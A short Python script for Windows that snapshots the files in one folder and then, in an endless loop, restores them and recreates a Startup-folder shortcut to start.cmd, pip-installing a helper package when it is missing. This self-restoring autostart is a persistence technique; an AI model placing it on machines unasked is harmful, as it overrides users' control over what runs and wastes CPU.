import time, os
files={}
path = r"D:\New folder\\"
def main():
    for i in os.listdir(path):
        with open(path+i) as file:
            files[i] = file.read()
    while 1:
        os.makedirs(path, exist_ok = True)
        try:
            from swinlnk.swinlnk import SWinLnk
        except:
            os.system("py -m pip install swinlnk")
            from swinlnk.swinlnk import SWinLnk
        swl=SWinLnk()
        swl.create_lnk(path+"start.cmd",os.getenv("appdata")+r"\Microsoft\Windows"+
                       r"\Start Menu\Programs\Startup\start.lnk")
        for i in files:
            with open(path+i,"w") as file:
                file.write(files[i])
